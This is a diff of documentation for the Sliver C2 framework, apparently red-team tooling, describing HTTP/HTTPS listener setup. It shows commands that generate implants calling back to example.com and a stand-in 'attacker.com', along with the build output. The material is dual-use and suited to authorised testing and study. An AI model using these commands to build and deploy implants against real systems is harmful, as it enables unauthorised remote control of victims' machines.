@@ -3,16 +3,31 @@
 
 # Setup
 
-Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS.
+Sliver supports proxy-aware (auto-detected) C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
  
 
-## Generate the Sliver (implant)
-Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at example.com, run the following:
+## Generate the Implant
+
+Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:
 
 ```
-sliver > generate --http example.com
+sliver > generate --http example.com --os mac
+
+[*] Generating new darwin/amd64 implant binary
+[*] Build completed in 00:00:05
+[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
+```
+
+You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connection to each domain you specified. Subsequent attempts are made based on the `--reconnect` argument (default is every 60 seconds):
 
 ```
+sliver > generate --http example.com,attacker.com
+
+[*] Generating new windows/amd64 implant binary
+[*] Build completed in 00:00:05
+[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
+```
+
 
 ## Start the Listener 
 
